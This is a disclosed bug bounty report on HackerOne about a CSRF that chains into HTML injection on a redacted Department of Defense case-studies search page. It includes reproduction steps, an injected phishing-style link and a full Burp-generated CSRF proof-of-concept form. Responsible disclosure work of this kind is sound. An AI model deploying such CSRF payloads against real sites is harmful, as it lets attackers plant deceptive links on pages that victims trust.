# CSRF to Stored HTML injection at https://www.█████

## Report Details
- **Report ID**: 1014593
- **URL**: https://hackerone.com/reports/1014593
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-21T11:10:46.068Z
- **Disclosed**: 2020-12-03T21:31:12.163Z

## Reporter
- **Username**: nagli
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
I have found out that on the https://www.███████ domain, you initiate POST request in order to look up for case studies, the parameter keyword on the request, allows the usage of bad characters such as < " ', although XSS payloads are pretty secured, HTML injection is an option.

As you might notice because this is a POST request, and the content is not initiated by the URL, i need to chain it with CSRF so the victim will get presented the malicious infected page, which you will see on the Video PoC, even upon refreshing is remain infected with the injection, only when you open a new tab, the page rests.

This allows me implementing malicious links and contents inside the case studies search page.

████████


## Step-by-step Reproduction Instructions

1. Navigate to https://www.█████
2. Craft a malicious HTML injection as you wish, I have injected: "<a href=https://naglinagli.github.io>Click here to win 1000$!</a>"
3. Save the POST request and craft CSRF payload.

## HTML snippet of the CSRF payload:
```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://www.███████" method="POST">
      <input type="hidden" name="keyword" value="&lt;a&#32;href&#61;https&#58;&#47;&#47;naglinagli&#46;github&#46;io&gt;Click&#32;here&#32;to&#32;win&#32;1000&#36;&#33;&lt;&#47;a&gt;" />
      <input type="hidden" name="Find&#32;Case&#32;Studies" value="Find&#32;Case&#32;Studies" />
      <input type="hidden" name="crimetype" value="none" />
      <input type="hidden" name="year" value="none" />
      <input type="hidden" name="gender" value="search&#46;php" />
      <input type="hidden" name="employeetype" value="none" />
      <input type="hidden" name="age" value="none" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

## Suggested Mitigation/Remediation Actions

Sanitizing malicious characters on the keyword parameter.

##Best Regards,
nagli

## Impact

CSRF to Stored HTML injection on the case-studies search page.

## Attachments
No attachments
